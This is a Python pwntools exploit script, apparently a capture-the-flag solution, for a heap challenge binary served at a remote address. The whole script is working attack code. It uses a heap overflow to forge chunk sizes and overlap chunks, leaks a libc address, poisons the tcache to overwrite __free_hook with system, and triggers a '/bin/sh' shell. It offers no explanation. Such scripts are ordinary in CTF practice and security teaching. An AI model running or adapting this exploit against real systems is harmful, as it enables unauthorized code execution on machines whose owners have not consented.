from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'

def add(idx, size):
    p.sendlineafter("> ", b'1')
    p.sendlineafter("> ", str(idx))
    p.sendlineafter("> ", str(size))

def delete(idx):
    p.sendlineafter("> ", b'2')
    p.sendlineafter("> ", str(idx))

def edit(idx, size, content):
    p.sendlineafter("> ", b'3')
    p.sendlineafter("> ", str(idx))
    p.sendlineafter("> ", str(size))
    p.sendafter("> ", content)

def show(idx):
    p.sendlineafter("> ", b'4')
    p.sendlineafter("> ", str(idx))

p = remote('10.99.210.100', 4241)
#p = process('./chal')
elf = ELF('./chal')
libc = ELF('./libc.so.6')

add(0, 0x10)
add(1, 0x10)
add(2, 0x500)
add(3, 0x10)

edit(0, 0x20, b'a' * 0x10 + p64(0) + p64(0x531))
delete(1)
add(4, 0x520)
edit(4, 0x520, b'a' * 0x10 + p64(0) + p64(0x511))
delete(2)

show(4)
p.recvuntil(b'\x11\x05')
libc.address = u64(p.recv(0x20)[6:6+8]) - 0x1ecbe0
print(hex(libc.address))

free_hook = libc.symbols['__free_hook']
system = libc.symbols['system']

add(5, 0x500)
edit(0, 0x20, b'a' * 0x10 + p64(0) + p64(0x21))

add(6, 0x40)
add(7, 0x40)
add(8, 0x40)
delete(8)
delete(7)
edit(6, 0x58, b'a' * 0x40 + p64(0) + p64(0x51) + p64(free_hook))
add(9, 0x40)
add(10, 0x40)
edit(10, 8, p64(system))
edit(9, 8, b'/bin/sh\x00')
delete(9)

p.interactive()
